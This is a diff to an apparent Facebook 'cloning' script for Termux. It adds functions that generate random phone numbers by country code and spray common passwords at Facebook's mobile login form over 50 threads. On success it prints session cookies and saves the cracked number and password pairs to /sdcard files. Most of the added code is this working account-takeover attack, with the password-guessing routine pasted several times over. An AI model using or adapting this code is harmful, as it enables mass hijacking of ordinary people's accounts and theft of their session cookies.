@@ -376,7 +376,7 @@ def Rdx1x():
 	print(logo)
 	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[1]  Bangladesh\x1b[1;97m☆.\x1b[1;92m[14]  Australia')
 	time.sleep(0.05)
-	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[2]  USA       \x1b[1;97m☆.\x1b[1;92m[15]  Canda')
+	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[2]  USA       \x1b[1;97m☆.\x1b[1;92m[15]  Canada')
 	time.sleep(0.05)
 	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[3]  UK        \x1b[1;97m☆.\x1b[1;92m[16]  China')
 	time.sleep(0.05)
@@ -388,17 +388,17 @@ def Rdx1x():
 	time.sleep(0.05)
 	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[7]  Korea     \x1b[1;97m☆.\x1b[1;92m[20]  Malaysia')
 	time.sleep(0.05)
-	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[8]  Italy     \x1b[1;97m☆.\x1b[1;92m[21]  Sri lanka')
+	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[8]  Italy     \x1b[1;97m☆.\x1b[1;92m[21]  Sri-lanka')
 	time.sleep(0.05)
 	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[9]  Spain     \x1b[1;97m☆.\x1b[1;92m[22]  Turkey')
 	time.sleep(0.05)
 	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[10] Poland    \x1b[1;97m☆.\x1b[1;92m[23]  U.A.E')
 	time.sleep(0.05)
-	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[11] Pakistan  \x1b[1;97m☆.\x1b[1;92m[24]  Saudi Arabia')
+	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[11] Pakistan  \x1b[1;97m☆.\x1b[1;92m[24]  Saudi-Arabia')
 	time.sleep(0.05)
-	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[12] Indonasia \x1b[1;97m☆.\x1b[1;92m[25]  Israil')
+	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[12] Indonesia \x1b[1;97m☆.\x1b[1;92m[25]  Israel')
 	time.sleep(0.05)
-	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[13] Grecee    \x1b[1;97m☆.\x1b[1;92m[26]  Iran')
+	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[13] Greece    \x1b[1;97m☆.\x1b[1;92m[26]  Iran')
 	time.sleep(0.05)
 	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;91m[0]  Back            ')
 	time.sleep(0.05)
@@ -520,396 +520,3546 @@ def action():
 		action()
 
 
-def bd():
-	print(logo7)
-	print("\x1b[1;97m0175,0165,0191, 0192, 0193, 0194, 0195, 017,019,013,014,016,170,180,190,150,015,130,140,018,0196, 0197, 0198, 0199")
-	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+880"
-		os.system('clear')
-		print(logo53)
-		os.system('clear')
-		print(logo7)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
+def korea():
+	xkorea = input ('\033[0;92mWhich Korea? ')
+	if xkorea =='1':
+		skorea()
+	elif peak =='2':
+		nkorea()
+	elif peak =='0':
 		Rdx1x()
+	else:
+		print('\x1b[1;97m[!] Wrong input')
+		Rdx1x()
+
+
+
+def bd():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
+	print(logo7)
+	print("\x1b[1;97m175,165,191, 192, 193, 194, 195, 171,196,130,140,16,17,18,19,15,13,14,185,177, 197, 198, 199")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+880"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo7)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-OK-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
+	try:
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def usa():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo8)
-	print("\x1b[1;97m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
+	print("\x1b[1;97m212,215,347,516,845,252,704,205,251,334,256,907,480,520,602,501,479,209,213,424,510,530,559,714,203,302,202,239,689,240,339,231,248,201,551,505,575")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+1"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo8)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+1"
-		os.system('clear')
-		print(logo)
-		print(logo8)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
 
 def uk():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo9)
 	print("\x1b[1;97m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+44"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo9)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+44"
-		os.system('clear')
-		print(logo)
-		print(logo9)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
 
 def india():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo10)
 	print("\x1b[1;97m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+91"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
